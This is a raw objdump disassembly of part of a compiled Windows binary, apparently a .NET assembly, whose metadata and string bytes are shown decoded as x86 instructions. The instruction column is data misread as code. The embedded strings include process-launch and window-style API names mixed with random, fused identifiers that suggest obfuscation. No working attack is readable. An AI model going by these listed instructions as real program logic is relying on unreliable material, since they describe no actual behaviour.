  40a318:	15 02 e1 00 8c       	adc    $0x8c00e102,%eax
  40a31d:	09 81 00 e9 00 8c    	or     %eax,-0x73ff1700(%ecx)
  40a323:	09 81 00 f1 00 8c    	or     %eax,-0x73ff0f00(%ecx)
  40a329:	09 81 00 f9 00 8c    	or     %eax,-0x73ff0700(%ecx)
  40a32f:	09 81 00 01 01 8c    	or     %eax,-0x73feff00(%ecx)
  40a335:	09 81 00 09 01 8c    	or     %eax,-0x73fef700(%ecx)
  40a33b:	09 81 00 11 01 8c    	or     %eax,-0x73feef00(%ecx)
  40a341:	09 81 00 19 01 8c    	or     %eax,-0x73fee700(%ecx)
  40a347:	09 9b 01 21 01 8c    	or     %ebx,-0x73fedeff(%ebx)
  40a34d:	09 81 00 29 01 8c    	or     %eax,-0x73fed700(%ecx)
  40a353:	09 81 00 31 01 8c    	or     %eax,-0x73fecf00(%ecx)
  40a359:	09 81 00 d1 00 8c    	or     %eax,-0x73ff2f00(%ecx)
  40a35f:	09 ea                	or     %ebp,%edx
  40a361:	02 2e                	add    (%esi),%ch
  40a363:	00 eb                	add    %ch,%bl
  40a365:	00 ed                	add    %ch,%ch
  40a367:	01 2e                	add    %ebp,(%esi)
  40a369:	00 f3                	add    %dh,%bl
  40a36b:	00 f6                	add    %dh,%dh
  40a36d:	01 2e                	add    %ebp,(%esi)
  40a36f:	00 fb                	add    %bh,%bl
  40a371:	00 1b                	add    %bl,(%ebx)
  40a373:	02 2e                	add    (%esi),%ch
  40a375:	00 03                	add    %al,(%ebx)
  40a377:	01 24 02             	add    %esp,(%edx,%eax,1)
  40a37a:	2e 00 0b             	add    %cl,%cs:(%ebx)
  40a37d:	01 31                	add    %esi,(%ecx)
  40a37f:	02 2e                	add    (%esi),%ch
  40a381:	00 13                	add    %dl,(%ebx)
  40a383:	01 31                	add    %esi,(%ecx)
  40a385:	02 2e                	add    (%esi),%ch
  40a387:	00 1b                	add    %bl,(%ebx)
  40a389:	01 37                	add    %esi,(%edi)
  40a38b:	02 2e                	add    (%esi),%ch
  40a38d:	00 23                	add    %ah,(%ebx)
  40a38f:	01 24 02             	add    %esp,(%edx,%eax,1)
  40a392:	2e 00 2b             	add    %ch,%cs:(%ebx)
  40a395:	01 47 02             	add    %eax,0x2(%edi)
  40a398:	2e 00 33             	add    %dh,%cs:(%ebx)
  40a39b:	01 31                	add    %esi,(%ecx)
  40a39d:	02 2e                	add    (%esi),%ch
  40a39f:	00 3b                	add    %bh,(%ebx)
  40a3a1:	01 31                	add    %esi,(%ecx)
  40a3a3:	02 2e                	add    (%esi),%ch
  40a3a5:	00 43 01             	add    %al,0x1(%ebx)
  40a3a8:	69 02 2e 00 4b 01    	imul   $0x14b002e,(%edx),%eax
  40a3ae:	93                   	xchg   %eax,%ebx
  40a3af:	02 2e                	add    (%esi),%ch
  40a3b1:	00 53 01             	add    %dl,0x1(%ebx)
  40a3b4:	a0 02 2e 00 5b       	mov    0x5b002e02,%al
  40a3b9:	01 f0                	add    %esi,%eax
  40a3bb:	02 01                	add    (%ecx),%al
  40a3bd:	00 81 00 00 00 03    	add    %al,0x3000000(%ecx)
  40a3c3:	00 01                	add    %al,(%ecx)
  40a3c5:	00 81 00 00 00 04    	add    %al,0x4000000(%ecx)
  40a3cb:	00 01                	add    %al,(%ecx)
  40a3cd:	00 8f 38 00 00 05    	add    %cl,0x5000038(%edi)
  40a3d3:	00 01                	add    %al,(%ecx)
  40a3d5:	00 0a                	add    %cl,(%edx)
  40a3d7:	00 00                	add    %al,(%eax)
  40a3d9:	00 06                	add    %al,(%esi)
  40a3db:	00 01                	add    %al,(%ecx)
  40a3dd:	00 06                	add    %al,(%esi)
  40a3df:	00 00                	add    %al,(%eax)
  40a3e1:	00 07                	add    %al,(%edi)
  40a3e3:	00 01                	add    %al,(%ecx)
  40a3e5:	00 0a                	add    %cl,(%edx)
  40a3e7:	00 00                	add    %al,(%eax)
  40a3e9:	00 08                	add    %cl,(%eax)
  40a3eb:	00 01                	add    %al,(%ecx)
  40a3ed:	00 09                	add    %cl,(%ecx)
  40a3ef:	00 00                	add    %al,(%eax)
  40a3f1:	00 09                	add    %cl,(%ecx)
  40a3f3:	00 01                	add    %al,(%ecx)
  40a3f5:	00 d8                	add    %bl,%al
  40a3f7:	01 00                	add    %eax,(%eax)
  40a3f9:	00 0a                	add    %cl,(%edx)
  40a3fb:	00 01                	add    %al,(%ecx)
  40a3fd:	00 20                	add    %ah,(%eax)
  40a3ff:	00 00                	add    %al,(%eax)
  40a401:	00 0b                	add    %cl,(%ebx)
  40a403:	00 01                	add    %al,(%ecx)
  40a405:	00 1a                	add    %bl,(%edx)
  40a407:	00 00                	add    %al,(%eax)
  40a409:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40a40c:	01 00                	add    %eax,(%eax)
  40a40e:	16                   	push   %ss
  40a40f:	00 00                	add    %al,(%eax)
  40a411:	00 0d 00 01 00 03    	add    %cl,0x3000100
  40a417:	00 00                	add    %al,(%eax)
  40a419:	00 0e                	add    %cl,(%esi)
  40a41b:	00 01                	add    %al,(%ecx)
  40a41d:	00 02                	add    %al,(%edx)
  40a41f:	00 00                	add    %al,(%eax)
  40a421:	00 0f                	add    %cl,(%edi)
  40a423:	00 01                	add    %al,(%ecx)
  40a425:	00 70 03             	add    %dh,0x3(%eax)
  40a428:	00 00                	add    %al,(%eax)
  40a42a:	10 00                	adc    %al,(%eax)
  40a42c:	15 00 32 00 37       	adc    $0x37003200,%eax
  40a431:	00 41 00             	add    %al,0x0(%ecx)
  40a434:	4b                   	dec    %ebx
  40a435:	00 58 00             	add    %bl,0x0(%eax)
  40a438:	5e                   	pop    %esi
  40a439:	00 63 00             	add    %ah,0x0(%ebx)
  40a43c:	6d                   	insl   (%dx),%es:(%edi)
  40a43d:	00 86 00 d5 00 ef    	add    %al,-0x10ff2b00(%esi)
  40a443:	00 f3                	add    %dh,%bl
  40a445:	00 f7                	add    %dh,%bh
  40a447:	00 90 00 41 01 46    	add    %dl,0x46014100(%eax)
  40a44d:	01 ad 00 80 01 c9    	add    %ebp,-0x36fe8000(%ebp)
  40a453:	00 86 01 48 00 55    	add    %al,0x55004801(%esi)
  40a459:	00 28                	add    %ch,(%eax)
  40a45b:	5e                   	pop    %esi
  40a45c:	00 00                	add    %al,(%eax)
  40a45e:	05 00 a9 5e 00       	add    $0x5ea900,%eax
  40a463:	00 06                	add    %al,(%esi)
  40a465:	00 2a                	add    %ch,(%edx)
  40a467:	5f                   	pop    %edi
  40a468:	00 00                	add    %al,(%eax)
  40a46a:	07                   	pop    %es
  40a46b:	00 b9 97 00 00 08    	add    %bh,0x8000097(%ecx)
  40a471:	00 c3                	add    %al,%bl
  40a473:	97                   	xchg   %eax,%edi
  40a474:	00 00                	add    %al,(%eax)
  40a476:	09 00                	or     %eax,(%eax)
  40a478:	c9                   	leave
  40a479:	97                   	xchg   %eax,%edi
  40a47a:	00 00                	add    %al,(%eax)
  40a47c:	0a 00                	or     (%eax),%al
  40a47e:	d3 97 00 00 0b 00    	rcll   %cl,0xb0000(%edi)
  40a484:	dc 97 00 00 0c 00    	fcoml  0xc0000(%edi)
  40a48a:	b4 99                	mov    $0x99,%ah
  40a48c:	00 00                	add    %al,(%eax)
  40a48e:	0d 00 d4 99 00       	or     $0x99d400,%eax
  40a493:	00 0e                	add    %cl,(%esi)
  40a495:	00 ee                	add    %ch,%dh
  40a497:	99                   	cltd
  40a498:	00 00                	add    %al,(%eax)
  40a49a:	0f 00 04 9a          	sldt   (%edx,%ebx,4)
  40a49e:	00 00                	add    %al,(%eax)
  40a4a0:	10 00                	adc    %al,(%eax)
  40a4a2:	07                   	pop    %es
  40a4a3:	9a 00 00 11 00 09 9a 	lcall  $0x9a09,$0x110000
  40a4aa:	00 00                	add    %al,(%eax)
  40a4ac:	12 00                	adc    (%eax),%al
  40a4ae:	04 80                	add    $0x80,%al
  40a4b0:	00 00                	add    %al,(%eax)
  40a4b2:	01 00                	add    %eax,(%eax)
	...
  40a4c0:	66 0b 00             	or     (%eax),%ax
  40a4c3:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40a4ce:	00 00                	add    %al,(%eax)
  40a4d0:	01 00                	add    %eax,(%eax)
  40a4d2:	1e                   	push   %ds
  40a4d3:	01 00                	add    %eax,(%eax)
  40a4d5:	00 00                	add    %al,(%eax)
  40a4d7:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40a4e2:	00 00                	add    %al,(%eax)
  40a4e4:	01 00                	add    %eax,(%eax)
  40a4e6:	3a 07                	cmp    (%edi),%al
  40a4e8:	00 00                	add    %al,(%eax)
  40a4ea:	00 00                	add    %al,(%eax)
  40a4ec:	00 49 6e             	add    %cl,0x6e(%ecx)
  40a4ef:	74 33                	je     0x40a524
  40a4f1:	32 00                	xor    (%eax),%al
  40a4f3:	49                   	dec    %ecx
  40a4f4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4f5:	74 36                	je     0x40a52d
  40a4f7:	34 00                	xor    $0x0,%al
  40a4f9:	68 35 51 45 6d       	push   $0x6d455135
  40a4fe:	4e                   	dec    %esi
  40a4ff:	69 2f 50 4c 66 4f    	imul   $0x4f664c50,(%edi),%ebp
  40a505:	75 4a                	jne    0x40a551
  40a507:	78 5a                	js     0x40a563
  40a509:	64 74 73             	fs je  0x40a57f
  40a50c:	33 50 31             	xor    0x31(%eax),%edx
  40a50f:	77 39                	ja     0x40a54a
  40a511:	78 54                	js     0x40a567
  40a513:	38 00                	cmp    %al,(%eax)
  40a515:	3c 4d                	cmp    $0x4d,%al
  40a517:	6f                   	outsl  %ds:(%esi),(%dx)
  40a518:	64 75 6c             	fs jne 0x40a587
  40a51b:	65 3e 00 47 65       	gs add %al,%ds:0x65(%edi)
  40a520:	74 53                	je     0x40a575
  40a522:	65 71 75             	gs jno 0x40a59a
  40a525:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a527:	63 65 50             	arpl   %esp,0x50(%ebp)
  40a52a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a52b:	69 6e 74 73 54 59 50 	imul   $0x50595473,0x74(%esi),%ebp
  40a532:	45                   	inc    %ebp
  40a533:	46                   	inc    %esi
  40a534:	4c                   	dec    %esp
  40a535:	41                   	inc    %ecx
  40a536:	47                   	inc    %edi
  40a537:	46                   	inc    %esi
  40a538:	4c                   	dec    %esp
  40a539:	49                   	dec    %ecx
  40a53a:	43                   	inc    %ebx
  40a53b:	45                   	inc    %ebp
  40a53c:	4e                   	dec    %esi
  40a53d:	53                   	push   %ebx
  40a53e:	45                   	inc    %ebp
  40a53f:	44                   	inc    %esp
  40a540:	00 49 54             	add    %cl,0x54(%ecx)
  40a543:	79 70                	jns    0x40a5b5
  40a545:	65 4c                	gs dec %esp
  40a547:	69 62 45 78 70 6f 72 	imul   $0x726f7078,0x45(%edx),%esp
  40a54e:	74 65                	je     0x40a5b5
  40a550:	72 4e                	jb     0x40a5a0
  40a552:	61                   	popa
  40a553:	6d                   	insl   (%dx),%es:(%edi)
  40a554:	65 50                	gs push %eax
  40a556:	72 6f                	jb     0x40a5c7
  40a558:	76 69                	jbe    0x40a5c3
  40a55a:	64 65 72 50          	fs gs jb 0x40a5ae
  40a55e:	6c                   	insb   (%dx),%es:(%edi)
  40a55f:	61                   	popa
  40a560:	74 66                	je     0x40a5c8
  40a562:	6f                   	outsl  %ds:(%esi),(%dx)
  40a563:	72 6d                	jb     0x40a5d2
  40a565:	49                   	dec    %ecx
  40a566:	44                   	inc    %esp
  40a567:	00 4f 65             	add    %cl,0x65(%edi)
  40a56a:	6d                   	insl   (%dx),%es:(%edi)
  40a56b:	54                   	push   %esp
  40a56c:	4f                   	dec    %edi
  40a56d:	4b                   	dec    %ebx
  40a56e:	45                   	inc    %ebp
  40a56f:	4e                   	dec    %esi
  40a570:	50                   	push   %eax
  40a571:	52                   	push   %edx
  40a572:	49                   	dec    %ecx
  40a573:	56                   	push   %esi
  40a574:	49                   	dec    %ecx
  40a575:	4c                   	dec    %esp
  40a576:	45                   	inc    %ebp
  40a577:	47                   	inc    %edi
  40a578:	45                   	inc    %ebp
  40a579:	00 4e 65             	add    %cl,0x65(%esi)
  40a57c:	77 45                	ja     0x40a5c3
  40a57e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a57f:	75 6d                	jne    0x40a5ee
  40a581:	43                   	inc    %ebx
  40a582:	41                   	inc    %ecx
  40a583:	4e                   	dec    %esi
  40a584:	4f                   	dec    %edi
  40a585:	46                   	inc    %esi
  40a586:	00 44 79 6e          	add    %al,0x6e(%ecx,%edi,2)
  40a58a:	44                   	inc    %esp
  40a58b:	61                   	popa
  40a58c:	74 61                	je     0x40a5ef
  40a58e:	4e                   	dec    %esi
  40a58f:	56                   	push   %esi
  40a590:	54                   	push   %esp
  40a591:	72 61                	jb     0x40a5f4
  40a593:	63 65 49             	arpl   %esp,0x49(%ebp)
  40a596:	00 53 79             	add    %dl,0x79(%ebx)
  40a599:	73 74                	jae    0x40a60f
  40a59b:	65 6d                	gs insl (%dx),%es:(%edi)
  40a59d:	2e 49                	cs dec %ecx
  40a59f:	4f                   	dec    %edi
  40a5a0:	00 53 65             	add    %dl,0x65(%ebx)
  40a5a3:	72 69                	jb     0x40a60e
  40a5a5:	61                   	popa
  40a5a6:	6c                   	insb   (%dx),%es:(%edi)
  40a5a7:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  40a5ae:	45                   	inc    %ebp
  40a5af:	76 65                	jbe    0x40a616
  40a5b1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5b2:	74 73                	je     0x40a627
  40a5b4:	43                   	inc    %ebx
  40a5b5:	4d                   	dec    %ebp
  40a5b6:	53                   	push   %ebx
  40a5b7:	48                   	dec    %eax
  40a5b8:	41                   	inc    %ecx
  40a5b9:	53                   	push   %ebx
  40a5ba:	48                   	dec    %eax
  40a5bb:	54                   	push   %esp
  40a5bc:	52                   	push   %edx
  40a5bd:	41                   	inc    %ecx
  40a5be:	4e                   	dec    %esi
  40a5bf:	53                   	push   %ebx
  40a5c0:	46                   	inc    %esi
  40a5c1:	4f                   	dec    %edi
  40a5c2:	52                   	push   %edx
  40a5c3:	4d                   	dec    %ebp
  40a5c4:	4d                   	dec    %ebp
  40a5c5:	41                   	inc    %ecx
  40a5c6:	4e                   	dec    %esi
  40a5c7:	49                   	dec    %ecx
  40a5c8:	46                   	inc    %esi
  40a5c9:	45                   	inc    %ebp
  40a5ca:	53                   	push   %ebx
  40a5cb:	54                   	push   %esp
  40a5cc:	49                   	dec    %ecx
  40a5cd:	4e                   	dec    %esi
  40a5ce:	56                   	push   %esi
  40a5cf:	41                   	inc    %ecx
  40a5d0:	52                   	push   %edx
  40a5d1:	49                   	dec    %ecx
  40a5d2:	41                   	inc    %ecx
  40a5d3:	4e                   	dec    %esi
  40a5d4:	54                   	push   %esp
  40a5d5:	00 50 72             	add    %dl,0x72(%eax)
  40a5d8:	65 76 69             	gs jbe 0x40a644
  40a5db:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5dc:	75 73                	jne    0x40a651
  40a5de:	56                   	push   %esi
  40a5df:	61                   	popa
  40a5e0:	6c                   	insb   (%dx),%es:(%edi)
  40a5e1:	75 65                	jne    0x40a648
  40a5e3:	50                   	push   %eax
  40a5e4:	43                   	inc    %ebx
  40a5e5:	44                   	inc    %esp
  40a5e6:	61                   	popa
  40a5e7:	74 61                	je     0x40a64a
  40a5e9:	00 53 45             	add    %dl,0x45(%ebx)
  40a5ec:	54                   	push   %esp
  40a5ed:	44                   	inc    %esp
  40a5ee:	45                   	inc    %ebp
  40a5ef:	46                   	inc    %esi
  40a5f0:	41                   	inc    %ecx
  40a5f1:	55                   	push   %ebp
  40a5f2:	4c                   	dec    %esp
  40a5f3:	54                   	push   %esp
  40a5f4:	56                   	push   %esi
  40a5f5:	41                   	inc    %ecx
  40a5f6:	4c                   	dec    %esp
  40a5f7:	55                   	push   %ebp
  40a5f8:	45                   	inc    %ebp
  40a5f9:	53                   	push   %ebx
  40a5fa:	44                   	inc    %esp
  40a5fb:	65 73 63             	gs jae 0x40a661
  40a5fe:	72 69                	jb     0x40a669
  40a600:	70 74                	jo     0x40a676
  40a602:	69 6f 6e 44 61 74 61 	imul   $0x61746144,0x6e(%edi),%ebp
  40a609:	00 6d 73             	add    %ch,0x73(%ebp)
  40a60c:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40a60f:	6c                   	insb   (%dx),%es:(%edi)
  40a610:	69 62 00 49 73 46 69 	imul   $0x69467349,0x0(%edx),%esp
  40a617:	6e                   	outsb  %ds:(%esi),(%dx)
  40a618:	61                   	popa
  40a619:	6c                   	insb   (%dx),%es:(%edi)
  40a61a:	47                   	inc    %edi
  40a61b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a61d:	65 72 69             	gs jb  0x40a689
  40a620:	63 00                	arpl   %eax,(%eax)
  40a622:	55                   	push   %ebp
  40a623:	6d                   	insl   (%dx),%es:(%edi)
  40a624:	41                   	inc    %ecx
  40a625:	6c                   	insb   (%dx),%es:(%edi)
  40a626:	51                   	push   %ecx
  40a627:	75 72                	jne    0x40a69b
  40a629:	61                   	popa
  40a62a:	43                   	inc    %ebx
  40a62b:	61                   	popa
  40a62c:	6c                   	insb   (%dx),%es:(%edi)
  40a62d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a62f:	64 61                	fs popa
  40a631:	72 43                	jb     0x40a676
  40a633:	6f                   	outsl  %ds:(%esi),(%dx)
  40a634:	70 79                	jo     0x40a6af
  40a636:	54                   	push   %esp
  40a637:	6f                   	outsl  %ds:(%esi),(%dx)
  40a638:	41                   	inc    %ecx
  40a639:	73 79                	jae    0x40a6b4
  40a63b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a63c:	63 00                	arpl   %eax,(%eax)
  40a63e:	53                   	push   %ebx
  40a63f:	79 6e                	jns    0x40a6af
  40a641:	63 68 72             	arpl   %ebp,0x72(%eax)
  40a644:	6f                   	outsl  %ds:(%esi),(%dx)
  40a645:	6e                   	outsb  %ds:(%esi),(%dx)
  40a646:	69 7a 65 64 53 65 72 	imul   $0x72655364,0x65(%edx),%edi
  40a64d:	76 65                	jbe    0x40a6b4
  40a64f:	72 43                	jb     0x40a694
  40a651:	6f                   	outsl  %ds:(%esi),(%dx)
  40a652:	6e                   	outsb  %ds:(%esi),(%dx)
  40a653:	74 65                	je     0x40a6ba
  40a655:	78 74                	js     0x40a6cb
  40a657:	53                   	push   %ebx
  40a658:	69 6e 6b 4d 75 69 52 	imul   $0x5269754d,0x6b(%esi),%ebp
  40a65f:	65 73 6f             	gs jae 0x40a6d1
  40a662:	75 72                	jne    0x40a6d6
  40a664:	63 65 54             	arpl   %esp,0x54(%ebp)
  40a667:	79 70                	jns    0x40a6d9
  40a669:	65 49                	gs dec %ecx
  40a66b:	64 49                	fs dec %ecx
  40a66d:	6e                   	outsb  %ds:(%esi),(%dx)
  40a66e:	74 45                	je     0x40a6b5
  40a670:	6e                   	outsb  %ds:(%esi),(%dx)
  40a671:	74 72                	je     0x40a6e5
  40a673:	79 46                	jns    0x40a6bb
  40a675:	69 65 6c 64 49 64 00 	imul   $0x644964,0x6c(%ebp),%esp
  40a67c:	44                   	inc    %esp
  40a67d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a67e:	6d                   	insl   (%dx),%es:(%edi)
  40a67f:	61                   	popa
  40a680:	69 6e 41 74 49 64 00 	imul   $0x644974,0x41(%esi),%ebp
  40a687:	52                   	push   %edx
  40a688:	65 61                	gs popa
  40a68a:	64 54                	fs push %esp
  40a68c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a68d:	45                   	inc    %ebp
  40a68e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a68f:	64 45                	fs inc %ebp
  40a691:	6e                   	outsb  %ds:(%esi),(%dx)
  40a692:	64 52                	fs push %edx
  40a694:	65 61                	gs popa
  40a696:	64 00 41 73          	add    %al,%fs:0x73(%ecx)
  40a69a:	73 65                	jae    0x40a701
  40a69c:	6d                   	insl   (%dx),%es:(%edi)
  40a69d:	62 6c 79 52          	bound  %ebp,0x52(%ecx,%edi,2)
  40a6a1:	65 67 69 73 74 72 61 	imul   $0x69746172,%gs:0x74(%bp,%di),%esi
  40a6a8:	74 69 
  40a6aa:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6ab:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6ac:	46                   	inc    %esi
  40a6ad:	6c                   	insb   (%dx),%es:(%edi)
  40a6ae:	61                   	popa
  40a6af:	67 73 50             	addr16 jae 0x40a702
  40a6b2:	69 64 00 41 6c 6c 6f 	imul   $0x776f6c6c,0x41(%eax,%eax,1),%esp
  40a6b9:	77 
  40a6ba:	54                   	push   %esp
  40a6bb:	72 61                	jb     0x40a71e
  40a6bd:	69 6c 69 6e 67 57 68 	imul   $0x69685767,0x6e(%ecx,%ebp,2),%ebp
  40a6c4:	69 
  40a6c5:	74 65                	je     0x40a72c
  40a6c7:	41                   	inc    %ecx
  40a6c8:	64 64 43             	fs fs inc %ebx
  40a6cb:	68 69 6c 64 00       	push   $0x646c69
  40a6d0:	67 65 74 48          	addr16 gs je 0x40a71c
  40a6d4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6d5:	73 74                	jae    0x40a74b
  40a6d7:	43                   	inc    %ebx
  40a6d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6d9:	6e                   	outsb  %ds:(%esi),(%dx)
  40a6da:	74 65                	je     0x40a741
  40a6dc:	78 74                	js     0x40a752
  40a6de:	53                   	push   %ebx
  40a6df:	65 74 47             	gs je  0x40a729
  40a6e2:	65 74 4d             	gs je  0x40a732
  40a6e5:	65 74 68             	gs je  0x40a750
  40a6e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a6e9:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40a6ed:	74 41                	je     0x40a730
  40a6ef:	74 74                	je     0x40a765
  40a6f1:	72 69                	jb     0x40a75c
  40a6f3:	62 75 74             	bound  %esi,0x74(%ebp)
  40a6f6:	65 53                	gs push %ebx
  40a6f8:	74 72                	je     0x40a76c
  40a6fa:	69 6e 67 49 73 4e 75 	imul   $0x754e7349,0x67(%esi),%ebp
  40a701:	6c                   	insb   (%dx),%es:(%edi)
  40a702:	6c                   	insb   (%dx),%es:(%edi)
  40a703:	4f                   	dec    %edi
  40a704:	72 57                	jb     0x40a75d
  40a706:	68 69 74 65 53       	push   $0x53657469
  40a70b:	70 61                	jo     0x40a76e
  40a70d:	63 65 00             	arpl   %esp,0x0(%ebp)
  40a710:	67 65 74 4e          	addr16 gs je 0x40a762
  40a714:	6f                   	outsl  %ds:(%esi),(%dx)
  40a715:	50                   	push   %eax
  40a716:	72 6f                	jb     0x40a787
  40a718:	6d                   	insl   (%dx),%es:(%edi)
  40a719:	70 74                	jo     0x40a78f
  40a71b:	43                   	inc    %ebx
  40a71c:	72 65                	jb     0x40a783
  40a71e:	61                   	popa
  40a71f:	74 65                	je     0x40a786
  40a721:	4e                   	dec    %esi
  40a722:	6f                   	outsl  %ds:(%esi),(%dx)
  40a723:	64 65 00 49 44       	fs add %cl,%gs:0x44(%ecx)
  40a728:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  40a72f:	6c                   	insb   (%dx),%es:(%edi)
  40a730:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40a734:	74 75                	je     0x40a7ab
  40a736:	72 6e                	jb     0x40a7a6
  40a738:	4d                   	dec    %ebp
  40a739:	65 73 73             	gs jae 0x40a7af
  40a73c:	61                   	popa
  40a73d:	67 65 44             	addr16 gs inc %esp
  40a740:	6f                   	outsl  %ds:(%esi),(%dx)
  40a741:	75 62                	jne    0x40a7a5
  40a743:	6c                   	insb   (%dx),%es:(%edi)
  40a744:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40a748:	6e                   	outsb  %ds:(%esi),(%dx)
  40a749:	74 69                	je     0x40a7b4
  40a74b:	6d                   	insl   (%dx),%es:(%edi)
  40a74c:	65 54                	gs push %esp
  40a74e:	79 70                	jns    0x40a7c0
  40a750:	65 48                	gs dec %eax
  40a752:	61                   	popa
  40a753:	6e                   	outsb  %ds:(%esi),(%dx)
  40a754:	64 6c                	fs insb (%dx),%es:(%edi)
  40a756:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40a75a:	74 54                	je     0x40a7b0
  40a75c:	79 70                	jns    0x40a7ce
  40a75e:	65 46                	gs inc %esi
  40a760:	72 6f                	jb     0x40a7d1
  40a762:	6d                   	insl   (%dx),%es:(%edi)
  40a763:	48                   	dec    %eax
  40a764:	61                   	popa
  40a765:	6e                   	outsb  %ds:(%esi),(%dx)
  40a766:	64 6c                	fs insb (%dx),%es:(%edi)
  40a768:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40a76c:	73 69                	jae    0x40a7d7
  40a76e:	7a 65                	jp     0x40a7d5
  40a770:	44                   	inc    %esp
  40a771:	6f                   	outsl  %ds:(%esi),(%dx)
  40a772:	4e                   	dec    %esi
  40a773:	6f                   	outsl  %ds:(%esi),(%dx)
  40a774:	74 41                	je     0x40a7b7
  40a776:	64 64 72 4f          	fs fs jb 0x40a7c9
  40a77a:	66 43                	inc    %bx
  40a77c:	73 70                	jae    0x40a7ee
  40a77e:	50                   	push   %eax
  40a77f:	61                   	popa
  40a780:	72 65                	jb     0x40a7e7
  40a782:	6e                   	outsb  %ds:(%esi),(%dx)
  40a783:	74 57                	je     0x40a7dc
  40a785:	69 6e 64 6f 77 48 61 	imul   $0x6148776f,0x64(%esi),%ebp
  40a78c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a78d:	64 6c                	fs insb (%dx),%es:(%edi)
  40a78f:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40a793:	69 6e 74 65 72 67 65 	imul   $0x65677265,0x74(%esi),%ebp
  40a79a:	74 48                	je     0x40a7e4
  40a79c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a79d:	73 74                	jae    0x40a813
  40a79f:	46                   	inc    %esi
  40a7a0:	69 6c 65 00 73 65 74 	imul   $0x5f746573,0x0(%ebp,%eiz,2),%ebp
  40a7a7:	5f 
  40a7a8:	57                   	push   %edi
  40a7a9:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  40a7b0:	79 6c                	jns    0x40a81e
  40a7b2:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  40a7b6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a7b7:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a7ba:	73 57                	jae    0x40a813
  40a7bc:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  40a7c3:	79 6c                	jns    0x40a831
  40a7c5:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  40a7c9:	74 5f                	je     0x40a82a
  40a7cb:	46                   	inc    %esi
  40a7cc:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40a7d3:	00 
  40a7d4:	44                   	inc    %esp
  40a7d5:	61                   	popa
  40a7d6:	74 65                	je     0x40a83d
  40a7d8:	54                   	push   %esp
  40a7d9:	69 6d 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%ebp),%ebp
  40a7e0:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  40a7e3:	65 00 49 43          	add    %cl,%gs:0x43(%ecx)
  40a7e7:	6c                   	insb   (%dx),%es:(%edi)
  40a7e8:	69 65 6e 74 52 65 73 	imul   $0x73655274,0x6e(%ebp),%esp
  40a7ef:	70 6f                	jo     0x40a860
  40a7f1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7f2:	73 65                	jae    0x40a859
  40a7f4:	43                   	inc    %ebx
  40a7f5:	68 61 6e 6e 65       	push   $0x656e6e61
  40a7fa:	6c                   	insb   (%dx),%es:(%edi)
  40a7fb:	53                   	push   %ebx
  40a7fc:	69 6e 6b 53 74 61 63 	imul   $0x63617453,0x6b(%esi),%ebp
  40a803:	6b 52 65 74          	imul   $0x74,0x65(%edx),%edx
  40a807:	75 72                	jne    0x40a87b
  40a809:	6e                   	outsb  %ds:(%esi),(%dx)
  40a80a:	56                   	push   %esi
  40a80b:	61                   	popa
  40a80c:	6c                   	insb   (%dx),%es:(%edi)
  40a80d:	75 65                	jne    0x40a874
  40a80f:	49                   	dec    %ecx
  40a810:	6e                   	outsb  %ds:(%esi),(%dx)
  40a811:	6c                   	insb   (%dx),%es:(%edi)
  40a812:	69 6e 65 00 46 69 6c 	imul   $0x6c694600,0x65(%esi),%ebp
  40a819:	65 4f                	gs dec %edi
  40a81b:	70 74                	jo     0x40a891
  40a81d:	69 6f 6e 73 52 75 6e 	imul   $0x6e755273,0x6e(%edi),%ebp
  40a824:	74 69                	je     0x40a88f
  40a826:	6d                   	insl   (%dx),%es:(%edi)
  40a827:	65 54                	gs push %esp
  40a829:	79 70                	jns    0x40a89b
  40a82b:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
  40a82f:	6c                   	insb   (%dx),%es:(%edi)
  40a830:	75 65                	jne    0x40a897
  40a832:	54                   	push   %esp
  40a833:	79 70                	jns    0x40a8a5
  40a835:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  40a839:	49                   	dec    %ecx
  40a83a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a83b:	73 74                	jae    0x40a8b1
  40a83d:	61                   	popa
  40a83e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a83f:	63 65 4f             	arpl   %esp,0x4f(%ebp)
  40a842:	66 54                	push   %sp
